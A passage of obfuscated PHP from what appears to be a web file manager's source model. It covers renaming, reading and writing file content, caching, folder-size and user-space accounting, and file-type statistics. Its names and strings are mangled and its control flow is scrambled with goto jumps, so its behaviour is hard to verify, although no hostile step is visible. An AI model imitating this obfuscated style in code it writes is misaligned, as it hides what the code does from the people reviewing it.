$_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÑ´³­”à = $FÑ´³­”à ? $FÑ´³­”à : array(); $E¿á‚™†Š” = $E¿á‚™†Š” ? $E¿á‚™†Š” : array(); goto Aó¿£¿±­ä; EÁœœ­ƒğ: Model($dÆÆµñ‡×ù[1982])->removeBySource($FÑ´³­”à); $this->where($d²çöËºğš)->delete(); Model($dÆÆµñ‡×ù[464])->remove($E¿á‚™†Š”); goto c—òç…ö´”; fá§¤ê·Öğ: $d²çöËºğš = array($dÆÆµñ‡×ù[412] => array($dÆÆµñ‡×ù[413], $FÑ´³­”à)); Model($dÆÆµñ‡×ù[2001])->where($d²çöËºğš)->delete(); Model($dÆÆµñ‡×ù[455])->where($d²çöËºğš)->delete(); goto B÷ğÓÙÏ¯; B÷ğÓÙÏ¯: Model($dÆÆµñ‡×ù[1859])->where($d²çöËºğš)->delete(); Model($dÆÆµñ‡×ù[558])->where($d²çöËºğš)->delete(); Model($dÆÆµñ‡×ù[1696])->removeBySource($FÑ´³­”à); goto EÁœœ­ƒğ; a¸—Ê‘Ÿ¥¦: } public function rename($eÃ§Â¶Ìõ, $FŒÈéßßïŞ) { goto FŠÛ©¨ƒ©ğ; F‡Æ¶Ã”ØÄ: $CÆÖ§±ì®’ = $F”æ©ãåğÖ[1990] . $BØ¬Üç›’§[$F”æ©ãåğÖ[492]]; if (isset(self::$cacheChildList[$CÆÖ§±ì®’])) { unset(self::$cacheChildList[$CÆÖ§±ì®’]); } return $bß“Ò±Ğã˜; goto B›­öö·ª»; d…šÄ¸ÙöŒ: $this->setNamePinyin($eÃ§Â¶Ìõ, $E×’¬Á‹ëÁ[$F”æ©ãåğÖ[28]], !1); $this->updateModifyTime($BØ¬Üç›’§[$F”æ©ãåğÖ[492]]); $bß“Ò±Ğã˜ = $this->where(array($F”æ©ãåğÖ[412] => $eÃ§Â¶Ìõ))->data($E×’¬Á‹ëÁ)->save(); goto F‡Æ¶Ã”ØÄ; B¼›§ï¼íÂ: if ($BØ¬Üç›’§[$F”æ©ãåğÖ[405]] != $F”æ©ãåğÖ[87]) { $E×’¬Á‹ëÁ[$F”æ©ãåğÖ[407]] = substr(get_path_ext($FŒÈéßßïŞ), 0, 10); } Model($F”æ©ãåğÖ[558])->eventRename($eÃ§Â¶Ìõ, $BØ¬Üç›’§[$F”æ©ãåğÖ[28]], $FŒÈéßßïŞ); $this->sourceCacheClear($eÃ§Â¶Ìõ); goto d…šÄ¸ÙöŒ; FŠÛ©¨ƒ©ğ: $F”æ©ãåğÖ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BØ¬Üç›’§ = $this->sourceInfo($eÃ§Â¶Ìõ); if (!$BØ¬Üç›’§) { return !1; } goto eòšŸÕ„œã; eòšŸÕ„œã: $b‰”¦íÂ¸ô = $this->fileNameExist($BØ¬Üç›’§[$F”æ©ãåğÖ[492]], $FŒÈéßßïŞ); if ($b‰”¦íÂ¸ô && $b‰”¦íÂ¸ô != $eÃ§Â¶Ìõ) { return !1; } $E×’¬Á‹ëÁ = array($F”æ©ãåğÖ[415] => $FŒÈéßßïŞ, $F”æ©ãåğÖ[577] => USER_ID); goto B¼›§ï¼íÂ; B›­öö·ª»: } public function setNamePinyin($b»êìïéèÉ, $e´ÕµƒŠÁğ, $e·¸Òõ‰ß = true) { $DåùÀÄŠ•ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¤¨…†µ› = Input::check($e´ÕµƒŠÁğ, $DåùÀÄŠ•ç[581]); $dğ¦ëä¥ä¾ = array($DåùÀÄŠ•ç[436] => KodSort::makeStr($e´ÕµƒŠÁğ)); if ($c¤¨…†µ›) { $dğ¦ëä¥ä¾[$DåùÀÄŠ•ç[458]] = str_replace($DåùÀÄŠ•ç[50], $DåùÀÄŠ•ç[33], Pinyin::get($e´ÕµƒŠÁğ)); $dğ¦ëä¥ä¾[$DåùÀÄŠ•ç[457]] = Pinyin::get($e´ÕµƒŠÁğ, $DåùÀÄŠ•ç[582]); } if (!$e·¸Òõ‰ß && !$c¤¨…†µ›) { $dğ¦ëä¥ä¾[$DåùÀÄŠ•ç[458]] = null; $dğ¦ëä¥ä¾[$DåùÀÄŠ•ç[457]] = null; } $this->metaSet($b»êìïéèÉ, $dğ¦ëä¥ä¾); } public function getContent($bÃ£Ú£‰Ÿ©) { goto D²ñï¥›æ; B™ ‡¡¨‘: if ($a–¼Œ°ŞÜ[$D¿œô’Ø[78]] == 0) { return $D¿œô’Ø[33]; } $dâäîÇå¡å = $D¿œô’Ø[2004] . $a–¼Œ°ŞÜ[$D¿œô’Ø[170]]; if ($a–¼Œ°ŞÜ[$D¿œô’Ø[78]] <= 1024 * 10) { $Bêöµè¡íé = Cache::get($dâäîÇå¡å); if (!$Bêöµè¡íé) { $Bêöµè¡íé = IO::getContent($a–¼Œ°ŞÜ[$D¿œô’Ø[76]]); Cache::set($dâäîÇå¡å, $Bêöµè¡íé); } return $Bêöµè¡íé; } goto BçåÂ™í§Ñ; D²ñï¥›æ: $D¿œô’Ø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a–¼Œ°ŞÜ = $this->fileInfoGet($bÃ£Ú£‰Ÿ©); if (!$a–¼Œ°ŞÜ) { return !1; } goto B™ ‡¡¨‘; BçåÂ™í§Ñ: if (!$a–¼Œ°ŞÜ[$D¿œô’Ø[76]]) { return $D¿œô’Ø[33]; } return IO::getContent($a–¼Œ°ŞÜ[$D¿œô’Ø[76]]); goto B‘¬ãßÂ¹›; B‘¬ãßÂ¹›: } public function setDesc($Cö÷Óª÷, $DŒ²÷˜ŸÀÌ) { $aöÁë”ÀÄ¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Model($aöÁë”ÀÄ¹[558])->eventAddDesc($Cö÷Óª÷, $DŒ²÷˜ŸÀÌ); return $this->metaSet($Cö÷Óª÷, $aöÁë”ÀÄ¹[445], $DŒ²÷˜ŸÀÌ); } public function setContent($DÓ·³Ë¥ÇÌ, $BÓçƒí±ÂÛ = '') { goto eÏÜí†×È÷; eÏÜí†×È÷: $d¥¼È¬¾ßî =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÂÅÒ¦‹«‘ = $this->sourceInfo($DÓ·³Ë¥ÇÌ); $E•™²š—İ½ = $this->fileInfoGet($DÓ·³Ë¥ÇÌ); goto Eé™£Ÿ†Óê; Eé™£Ÿ†Óê: if (!$E•™²š—İ½ || !$bÂÅÒ¦‹«‘) { return !1; } $FöÈì–ËÉÜ = Model($d¥¼È¬¾ßî[464])->addFileByContent($BÓçƒí±ÂÛ, $bÂÅÒ¦‹«‘[$d¥¼È¬¾ßî[28]]); $f¤·Ş›©÷ = $this->fileHistory($bÂÅÒ¦‹«‘, $FöÈì–ËÉÜ[$d¥¼È¬¾ßî[461]], $FöÈì–ËÉÜ[$d¥¼È¬¾ßî[78]]); goto c†“´Üã‡; c†“´Üã‡: if (!$f¤·Ş›©÷) { return Model($d¥¼È¬¾ßî[464])->remove($FöÈì–ËÉÜ[$d¥¼È¬¾ßî[461]]); } $this->folderSizeReset($bÂÅÒ¦‹«‘[$d¥¼È¬¾ßî[492]]); return !0; goto F‹¹õçšèÄ; F‹¹õçšèÄ: } public function fileSubstr($c©áöŞ¶, $bäÒÏ¾ÖÃ, $Bí™ĞÔ‚µË) { $B£—Î‘İ¤… = $this->fileInfoGet($c©áöŞ¶); if (!$B£—Î‘İ¤…) { return !1; } return IO::fileSubstr($B£—Î‘İ¤…[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]], $bäÒÏ¾ÖÃ, $Bí™ĞÔ‚µË); } public function fileInfoGet($FÍÂ‘´ß) { goto c¨˜¹ºÄ¶¯; A¬Ï‚Ğ´¶İ: $BˆíÜÌìõ = $bïÎˆ »‹[467] . $bºÁ‡Ô¤½[$bïÎˆ »‹[461]]; $fãœ£ÅÎ = _get(self::$cacheFileInfo, $BˆíÜÌìõ); if ($fãœ£ÅÎ) { return $fãœ£ÅÎ; } goto Cİ¯›’„™; Cİ¯›’„™: $cç®Ö–èÕÓ = Model($bïÎˆ »‹[464])->fileInfo($bºÁ‡Ô¤½[$bïÎˆ »‹[461]]); if ($cç®Ö–èÕÓ) { $cç®Ö–èÕÓ[$bïÎˆ »‹[28]] = $bºÁ‡Ô¤½[$bïÎˆ »‹[28]]; } self::$cacheFileInfo[$BˆíÜÌìõ] = $cç®Ö–èÕÓ; goto cİ˜©¸ãÏ; cİ˜©¸ãÏ: return $cç®Ö–èÕÓ; goto aÃåĞâ¼“Å; c¨˜¹ºÄ¶¯: $bïÎˆ »‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bºÁ‡Ô¤½ = $this->sourceInfo($FÍÂ‘´ß); if (!$bºÁ‡Ô¤½ || $bºÁ‡Ô¤½[$bïÎˆ »‹[405]]) { return !1; } goto A¬Ï‚Ğ´¶İ; aÃåĞâ¼“Å: } private function folderChildrenNumber($Fœâ°™ÊÇ¢) { $AÉÆğò‡Ù¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÅŒ¥ÓÉŞ£ = $this->sourceInfo($Fœâ°™ÊÇ¢); $A»£µ–Äœ× = array($AÉÆğò‡Ù¥[578] => array($AÉÆğò‡Ù¥[538], $fÅŒ¥ÓÉŞ£[$AÉÆğò‡Ù¥[515]] . $Fœâ°™ÊÇ¢ . $AÉÆğò‡Ù¥[539]), $AÉÆğò‡Ù¥[424] => intval($fÅŒ¥ÓÉŞ£[$AÉÆğò‡Ù¥[425]]), $AÉÆğò‡Ù¥[571] => 1); $eÉğÜÓ¿ÕÍ = $this->where($A»£µ–Äœ×)->count(); $c›¬Ûñ¸‘ = $this->where($A»£µ–Äœ×)->where(array($AÉÆğò‡Ù¥[571] => 0))->count(); return array($AÉÆğò‡Ù¥[82] => $c›¬Ûñ¸‘, $AÉÆğò‡Ù¥[83] => $eÉğÜÓ¿ÕÍ); } public function pathInfo($b½÷·©‡ó˜, $bƒ¥ùÌ…ÓŞ = false) { goto f‘ñ„È¹‰á; f‘ñ„È¹‰á: $d‚æô™…¹‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bƒ¥ùÌ…ÓŞ = !1; $b½÷·©‡ó˜ = intval($b½÷·©‡ó˜); goto dÃ²©¸È‘æ; Fõ®ŞìÔ: $B Ü°ÇÁØç = $this->sourceInfo($b½÷·©‡ó˜); if (!$B Ü°ÇÁØç) { return !1; } $B Ü°ÇÁØç = $this->_listDataApplyItem($B Ü°ÇÁØç, $bƒ¥ùÌ…ÓŞ); goto eİÄƒ¸¾–ä; eİÄƒ¸¾–ä: self::$cachePathInfo[$A¸‹¬ï³Ü½] = $B Ü°ÇÁØç; return $B Ü°ÇÁØç; goto B£„»ñ›ê‘; dÃ²©¸È‘æ: $A¸‹¬ï³Ü½ = $d‚æô™…¹‹[453] . intval($bƒ¥ùÌ…ÓŞ) . $d‚æô™…¹‹[454] . $b½÷·©‡ó˜; $dí©£áƒÀ = _get(self::$cachePathInfo, $A¸‹¬ï³Ü½); if ($dí©£áƒÀ) { return $dí©£áƒÀ; } goto Fõ®ŞìÔ; B£„»ñ›ê‘: } public static $cachePathInfoMore = array(); public function pathInfoMore($Cİ¿Çˆ’Õ) { goto B±Ü­’÷§‡; Bôâô©—ß: $E·§Œš†ó¶ = $this->pathInfo($Cİ¿Çˆ’Õ); if (!$E·§Œš†ó¶) { return !1; } if ($E·§Œš†ó¶[$E©‘’Üº¾Ê[405]] == $E©‘’Üº¾Ê[87]) { $E·§Œš†ó¶[$E©‘’Üº¾Ê[81]] = $this->folderChildrenNumber($Cİ¿Çˆ’Õ); } goto dà¸™ÜÎ¿Œ; B±Ü­’÷§‡: $E©‘’Üº¾Ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e©¢›ŞÔ‘õ = _get(self::$cachePathInfoMore, $Cİ¿Çˆ’Õ); if ($e©¢›ŞÔ‘õ) { return $e©¢›ŞÔ‘õ; } goto Bôâô©—ß; dà¸™ÜÎ¿Œ: self::$cachePathInfoMore[$Cİ¿Çˆ’Õ] = $E·§Œš†ó¶; return $E·§Œš†ó¶; goto e›çÁ³İòµ; e›çÁ³İòµ: } public function sourceInfo($e±Ü—Ù—ò) { goto D¼ÑÚ¦«ã¸; D¼ÑÚ¦«ã¸: $BÅ‡„¥‘ã‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$e±Ü—Ù—ò) { return array(); } $e±Ü—Ù—ò = intval($e±Ü—Ù—ò); goto CÈÇäôİÖ; B‚÷§È¶–œ: $F™Œ¿÷ŒÚ = $this->where(array($BÅ‡„¥‘ã‰[397] => $e±Ü—Ù—ò))->find(); self::$cacheSourceInfo[$bĞ„·ã‰Œà] = $F™Œ¿÷ŒÚ; return self::$cacheSourceInfo[$bĞ„·ã‰Œà]; goto eÜÛáÍ…Œ; CÈÇäôİÖ: $bĞ„·ã‰Œà = $BÅ‡„¥‘ã‰[452] . $e±Ü—Ù—ò; $B¯ŸŠéù = _get(self::$cacheSourceInfo, $bĞ„·ã‰Œà); if ($B¯ŸŠéù) { return $B¯ŸŠéù; } goto B‚÷§È¶–œ; eÜÛáÍ…Œ: } public function sourceCacheClear($aòåÓˆ˜™ = false) { self::cacheClear($aòåÓˆ˜™); } public static function cacheClear($b³ö¾ËÅî± = false) { $CØ­ŞÎŸ…ñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($b³ö¾ËÅî± == !1) { goto D×—­¼íŠ; Eé“ÓŞÕÔà: return; goto dË‚ƒ¨ğö; D×—­¼íŠ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto a„‡µé«‹Ğ; a„‡µé«‹Ğ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto Eé“ÓŞÕÔà; dË‚ƒ¨ğö: } unset(self::$cacheSourceInfo[$CØ­ŞÎŸ…ñ[452] . $b³ö¾ËÅî±]); unset(self::$cachePathInfoMore[$b³ö¾ËÅî±]); unset(self::$cachePathInfo[$CØ­ŞÎŸ…ñ[2005] . $b³ö¾ËÅî±]); unset(self::$cachePathInfo[$CØ­ŞÎŸ…ñ[2006] . $b³ö¾ËÅî±]); } public function metaSet($DÊËõô’öª, $C¬¤Šé”â = null, $E‰œºäÓ˜‘ = null) { $dÏŞ¡“’½ = parent::metaSet($DÊËõô’öª, $C¬¤Šé”â, $E‰œºäÓ˜‘); if ($dÏŞ¡“’½) { $this->sourceCacheClear($DÊËõô’öª); } return $dÏŞ¡“’½; } public function pathInfoByPath($E„´À™§, $D©ñ‹Ú¥ø†) { $DœçÓÈíò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EİÕ±Ö ®Ï = !$D©ñ‹Ú¥ø† ? array() : explode($DœçÓÈíò[8], trim($D©ñ‹Ú¥ø†, $DœçÓÈíò[8])); $EºÀ‹Êƒ¾­ = $E„´À™§; foreach ($EİÕ±Ö ®Ï as $E…á˜ÒŠê) { $C¶çÉ×ÖÈ“ = array($DœçÓÈíò[492] => $EºÀ‹Êƒ¾­, $DœçÓÈíò[28] => $E…á˜ÒŠê); $b·ÖìŸ–½Ó = $this->where($C¶çÉ×ÖÈ“)->select(); if (!$b·ÖìŸ–½Ó) { return !1; } $b·ÖìŸ–½Ó = array_sort_by($b·ÖìŸ–½Ó, $DœçÓÈíò[425]); $EºÀ‹Êƒ¾­ = $b·ÖìŸ–½Ó[0][$DœçÓÈíò[397]]; } return $this->pathInfo($EºÀ‹Êƒ¾­, !0); } protected function updateModifyTime($dÅÖ’¼…†) { goto BÏò¹Ò¨Ö×; d—·¤ö¢÷‚: if (!is_array($dÅÖ’¼…†)) { $dÅÖ’¼…† = array($dÅÖ’¼…†); } foreach ($dÅÖ’¼…† as $Aºã«¼§Ãº => $CÑ³Ú“é‚é) { $dÅÖ’¼…†[$Aºã«¼§Ãº] = intval($CÑ³Ú“é‚é); $this->sourceCacheClear($CÑ³Ú“é‚é); } $D¼øé‚È½á = array($e—Ò»¯ŞèÏ[397] => array($e—Ò»¯ŞèÏ[7], $dÅÖ’¼…†)); goto DÆÈÏ±ÁË; BÏò¹Ò¨Ö×: $e—Ò»¯ŞèÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A­ïÚÙÖ—Ğ = defined($e—Ò»¯ŞèÏ[468]) ? USER_ID : $e—Ò»¯ŞèÏ[191]; if (!$dÅÖ’¼…†) { return; } goto d—·¤ö¢÷‚; DÆÈÏ±ÁË: $fìõÀù‹ˆ¤ = array($e—Ò»¯ŞèÏ[577] => $A­ïÚÙÖ—Ğ, $e—Ò»¯ŞèÏ[419] => time()); $this->where($D¼øé‚È½á)->save($fìõÀù‹ˆ¤); goto Câ±õ±À¢š; Câ±õ±À¢š: } public function folderSizeReset($eÍˆ‘†“¥, $bàğÃÑÈØÔ = false) { goto a÷°†ºÛ; C›´ºğ¢Şê: $DİÒÑ“××”[] = $D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[397]]; $B´´‚¶ùóù = array($E´ ‚ĞâçŞ[397] => array($E´ ‚ĞâçŞ[413], $DİÒÑ“××”)); if ($bàğÃÑÈØÔ < 0) { $B´´‚¶ùóù[$E´ ‚ĞâçŞ[78]] = array($E´ ‚ĞâçŞ[995], abs($bàğÃÑÈØÔ)); } goto eÎ’Çê¯ŠÅ; eÎ’Çê¯ŠÅ: $this->where($B´´‚¶ùóù)->setAdd($E´ ‚ĞâçŞ[78], $bàğÃÑÈØÔ); CacheLock::unlock($A‚ø¸±Ñ„”); $f™†É¥©ÙÜ = $E´ ‚ĞâçŞ[2008] . $D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[406]] . $E´ ‚ĞâçŞ[4] . $D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[498]]; goto BÍèÔ˜®ó; a÷°†ºÛ: $E´ ‚ĞâçŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->statusIgnoreResetSpace) { return; } $D°ãâ‚ß…ù = $this->sourceInfo($eÍˆ‘†“¥); goto FĞ†àìëì; FĞ†àìëì: $A‚ø¸±Ñ„” = $E´ ‚ĞâçŞ[2007] . $eÍˆ‘†“¥; CacheLock::lock($A‚ø¸±Ñ„”, 20); if ($bàğÃÑÈØÔ === !1) { $this->sourceCacheClear($eÍˆ‘†“¥); $D°ãâ‚ß…ù = $this->sourceInfo($eÍˆ‘†“¥); $B´´‚¶ùóù = array($E´ ‚ĞâçŞ[396] => $eÍˆ‘†“¥, $E´ ‚ĞâçŞ[424] => 0); $D‰ªÖéÑá = $this->where($B´´‚¶ùóù)->sum($E´ ‚ĞâçŞ[78]); $bàğÃÑÈØÔ = intval($D‰ªÖéÑá) - intval($D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[78]]); } goto F‘Ùàµ«©¼; F‘Ùàµ«©¼: if ($bàğÃÑÈØÔ == 0) { return CacheLock::unlock($A‚ø¸±Ñ„”); } $DİÒÑ“××” = $this->parentLevelArray($D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[515]]); if (!$DİÒÑ“××”) { $DİÒÑ“××” = array(); } goto C›´ºğ¢Şê; BÍèÔ˜®ó: $C‡¾–ŒÈÙÁ = array($D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[406]], $D°ãâ‚ß…ù[$E´ ‚ĞâçŞ[498]]); TaskRun::timeLimitCall($f™†É¥©ÙÜ, $E´ ‚ĞâçŞ[2009], $C‡¾–ŒÈÙÁ, 1.5); goto d¼œøÚåÓ; d¼œøÚåÓ: } public function folderSizeResetChildren($Fí††§“®Ú) { goto DÎÜ§âàË¯; Cõ˜ì…Ë°í: foreach ($aÊÈ¼ÜÇ as $C™¤à¯ÜÁ°) { $b»‰ñÎãºÈ = $C™¤à¯ÜÁ°[$d”öœø§¨†[492]] . $d”öœø§¨†[33]; if (!isset($B­ƒÔ±ª©[$b»‰ñÎãºÈ])) { continue; } if ($C™¤à¯ÜÁ°[$d”öœø§¨†[425]] == $B­ƒÔ±ª©[$b»‰ñÎãºÈ][$d”öœø§¨†[425]]) { $B­ƒÔ±ª©[$b»‰ñÎãºÈ][$d”öœø§¨†[78]] += $C™¤à¯ÜÁ°[$d”öœø§¨†[78]]; } } foreach ($B­ƒÔ±ª© as $C™¤à¯ÜÁ°) { $F™´¤îµà = $this->parentLevelArray($C™¤à¯ÜÁ°[$d”öœø§¨†[515]]); foreach ($F™´¤îµà as $b»‰ñÎãºÈ) { $b»‰ñÎãºÈ = $b»‰ñÎãºÈ . $d”öœø§¨†[33]; if (!isset($B­ƒÔ±ª©[$b»‰ñÎãºÈ])) { continue; } if ($C™¤à¯ÜÁ°[$d”öœø§¨†[425]] == $B­ƒÔ±ª©[$b»‰ñÎãºÈ][$d”öœø§¨†[425]]) { $B­ƒÔ±ª©[$b»‰ñÎãºÈ][$d”öœø§¨†[78]] += $C™¤à¯ÜÁ°[$d”öœø§¨†[78]]; } } } $c‰ø¸ÖÃÈ· = array(); goto cˆÜÚíÁã; f„§Ïè°‡É: $EÍÕµ¯Ñì[$d”öœø§¨†[405]] = 0; $aÊÈ¼ÜÇ = $this->field($F‘Áâ¹šá)->where($EÍÕµ¯Ñì)->select(); if (!$aÊÈ¼ÜÇ) { return; } goto e¸ºÜé½ä¤; cˆÜÚíÁã: foreach ($B­ƒÔ±ª© as $C™¤à¯ÜÁ°) { if ($C™¤à¯ÜÁ°[$d”öœø§¨†[78]] == $C™¤à¯ÜÁ°[$d”öœø§¨†[2011]]) { continue; } $c‰ø¸ÖÃÈ·[] = array($d”öœø§¨†[397], $C™¤à¯ÜÁ°[$d”öœø§¨†[397]], $d”öœø§¨†[78], $C™¤à¯ÜÁ°[$d”öœø§¨†[78]]); } $this->saveAll($c‰ø¸ÖÃÈ·); goto C»÷Î¡œÁ¿; DÎÜ§âàË¯: $d”öœø§¨† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->sourceCacheClear($Fí††§“®Ú); $d»»› ¡ë™ = $this->sourceInfo($Fí††§“®Ú); goto Bİõ˜á”¯; e¸ºÜé½ä¤: $B­ƒÔ±ª©[] = $d»»› ¡ë™; $B­ƒÔ±ª© = array_to_keyvalue($B­ƒÔ±ª©, $d”öœø§¨†[397]); foreach ($B­ƒÔ±ª© as $eÜ’¤‰µÖƒ => $C™¤à¯ÜÁ°) { $B­ƒÔ±ª©[$eÜ’¤‰µÖƒ][$d”öœø§¨†[2011]] = $B­ƒÔ±ª©[$eÜ’¤‰µÖƒ][$d”öœø§¨†[78]]; $B­ƒÔ±ª©[$eÜ’¤‰µÖƒ][$d”öœø§¨†[78]] = 0; } goto Cõ˜ì…Ë°í; Bİõ˜á”¯: $EÍÕµ¯Ñì = array($d”öœø§¨†[571] => 1, $d”öœø§¨†[578] => array($d”öœø§¨†[538], $d»»› ¡ë™[$d”öœø§¨†[515]] . $Fí††§“®Ú . $d”öœø§¨†[539])); $F‘Áâ¹šá = $d”öœø§¨†[2010]; $B­ƒÔ±ª© = $this->field($F‘Áâ¹šá)->where($EÍÕµ¯Ñì)->select(); goto f„§Ïè°‡É; C»÷Î¡œÁ¿: } public function userSpaceReset($ağêÕ±•¤ = false) { $aïÒĞ‡Ÿ¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aª’²‡±Ñ = $this->where(array($aïÒĞ‡Ÿ¨[406] => self::TYPE_USER, $aïÒĞ‡Ÿ¨[498] => $ağêÕ±•¤, $aïÒĞ‡Ÿ¨[405] => 0))->sum($aïÒĞ‡Ÿ¨[78]); $Aª’²‡±Ñ = !$Aª’²‡±Ñ || $Aª’²‡±Ñ <= 0 ? 0 : $Aª’²‡±Ñ; Model($aïÒĞ‡Ÿ¨[507])->userEdit($ağêÕ±•¤, array($aïÒĞ‡Ÿ¨[1705] => $Aª’²‡±Ñ)); } public function targetSpaceUpdate($EÎé´ÙÓöÃ, $Dğ‡ªÕ¯­) { $aÚ†ĞïÏ° =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Dğ‡ªÕ¯­) { return; } if (!in_array($EÎé´ÙÓöÃ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $AäÏ½ªôïù = $this->targetSpaceSize($EÎé´ÙÓöÃ, $Dğ‡ªÕ¯­); if ($EÎé´ÙÓöÃ == self::TYPE_USER) { Model($aÚ†ĞïÏ°[507])->userEdit($Dğ‡ªÕ¯­, array($aÚ†ĞïÏ°[1705] => $AäÏ½ªôïù)); } else { if ($EÎé´ÙÓöÃ == self::TYPE_GROUP) { Model($aÚ†ĞïÏ°[516])->groupEdit($Dğ‡ªÕ¯­, array($aÚ†ĞïÏ°[1705] => $AäÏ½ªôïù)); } } } public function targetSpaceSize($dĞë÷»ÓáÕ, $a™’¥¬ĞîŒ) { goto FÒš‘…Ã”‹; A©åÏ‰™ó…: $fêèˆ®¤ß = !$fêèˆ®¤ß || $fêèˆ®¤ß <= 0 ? 0 : $fêèˆ®¤ß; return $fêèˆ®¤ß; goto fªÛ«¬‡ŸÇ; E¶‡¹ßÈî°: $f” šëù‘ = array_to_keyvalue($f” šëù‘, $D³ˆƒáÍÌ[33], $D³ˆƒáÍÌ[397]); $f” šëù‘ = array_unique(array_filter($f” šëù‘)); if ($f” šëù‘) { $EÅÇ¾¸ÙÊù = array($D³ˆƒáÍÌ[412] => array($D³ˆƒáÍÌ[413], $f” šëù‘)); $fêèˆ®¤ß += floatval($this->where($EÅÇ¾¸ÙÊù)->sum($D³ˆƒáÍÌ[78])); } goto A©åÏ‰™ó…; FÒš‘…Ã”‹: $D³ˆƒáÍÌ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÜÉšßÁŒ = $this->sourceRoot($dĞë÷»ÓáÕ, $a™’¥¬ĞîŒ, !0); if (!$EÜÉšßÁŒ) { return 0; } goto DÌ¡ù™¤¯; DÌ¡ù™¤¯: $fêèˆ®¤ß = floatval($EÜÉšßÁŒ[$D³ˆƒáÍÌ[78]]); $EÅÇ¾¸ÙÊù = array($D³ˆƒáÍÌ[578] => array($D³ˆƒáÍÌ[538], $D³ˆƒáÍÌ[525] . $EÜÉšßÁŒ[$D³ˆƒáÍÌ[397]] . $D³ˆƒáÍÌ[539])); $f” šëù‘ = Model($D³ˆƒáÍÌ[423])->field($D³ˆƒáÍÌ[412])->where($EÅÇ¾¸ÙÊù)->select(); goto E¶‡¹ßÈî°; fªÛ«¬‡ŸÇ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Bâõó×“õò) { return $this->fileTypeProfile($Bâõó×“õò, SourceModel::TYPE_USER); } public function groupFileTypeProfile($bÜ‡†©¥İˆ) { return $this->fileTypeProfile($bÜ‡†©¥İˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($bâø‡êÒ²³, $bË¼İ Ì) { goto cêš›˜Ñ; e“ÂÛÂòâ¾: $E¶‹º–Ñ²´ = array(); $E¶‹º–Ñ²´[$B†Ñ–†Îø[2013]] = array($B†Ñ–†Îø[2014] => LNG($B†Ñ–†Îø[2013]), $B†Ñ–†Îø[2015] => $this->where($DœœÃĞ«é“)->count(), $B†Ñ–†Îø[573] => $this->where($DœœÃĞ«é“)->sum($B†Ñ–†Îø[78])); $Bƒôö¼ÓĞ = KodIO::fileTypeList(); goto bß¨ÅÏÄøš; aŞ©ç™¸ì: if ($BÂµæœ›’©) { return $BÂµæœ›’©; } $DœœÃĞ«é“ = array($B†Ñ–†Îø[571] => 0); if ($bâø‡êÒ²³ != !1) { $DœœÃĞ«é“[$B†Ñ–†Îø[498]] = $bâø‡êÒ²³; $DœœÃĞ«é“[$B†Ñ–†Îø[406]] = $bË¼İ Ì; } goto e“ÂÛÂòâ¾; bß¨ÅÏÄøš: foreach ($Bƒôö¼ÓĞ as $fãô±“ŞŠ… => $bãÌŒâù£“) { $DœœÃĞ«é“[$B†Ñ–†Îø[407]] = $this->fileTypeWhere($fãô±“ŞŠ…); $E¶‹º–Ñ²´[$fãô±“ŞŠ…] = array($B†Ñ–†Îø[2014] => $bãÌŒâù£“[$B†Ñ–†Îø[28]], $B†Ñ–†Îø[2015] => $this->where($DœœÃĞ«é“)->count(), $B†Ñ–†Îø[573] => $this->where($DœœÃĞ«é“)->sum($B†Ñ–†Îø[78])); } Cache::set($a÷—ØÅ£Û’, $E¶‹º–Ñ²´, 1200); return $E¶‹º–Ñ²´; goto Aº¾Ç£â·÷; cêš›˜Ñ: $B†Ñ–†Îø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a÷—ØÅ£Û’ = $B†Ñ–†Îø[2012] . $bâø‡êÒ²³ . $B†Ñ–†Îø[71] . $bË¼İ Ì; $BÂµæœ›’© = Cache::get($a÷—ØÅ£Û’); goto aŞ©ç™¸ì; Aº¾Ç£â·÷: } public function fileNameExist($díÍ‚õÖæ, $fÕ‰ãİ†¸–) { $fâ˜ƒª†‚ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÇ„ĞÍØŒÅ = $this->where(array($fâ˜ƒª†‚ä[492] => $díÍ‚õÖæ, $fâ˜ƒª†‚ä[28] => $fÕ‰ãİ†¸–, $fâ˜ƒª†‚ä[425] => 0))->find(); return is_array($FÇ„ĞÍØŒÅ) ? $FÇ„ĞÍØŒÅ[$fâ˜ƒª†‚ä[397]] : !1; } public function childList($eÌ¦â±ËÔÂ) { goto aö¦Äö‘æ; EÙ¾·¸±—: self::$cacheChildList[$dç øìº´] = $fÅÎ§©¿­ñ; foreach ($fÅÎ§©¿­ñ as $A°Ë¨Èµ’¹) { $dç øìº´ = $aªÄç®÷Ì§[452] . 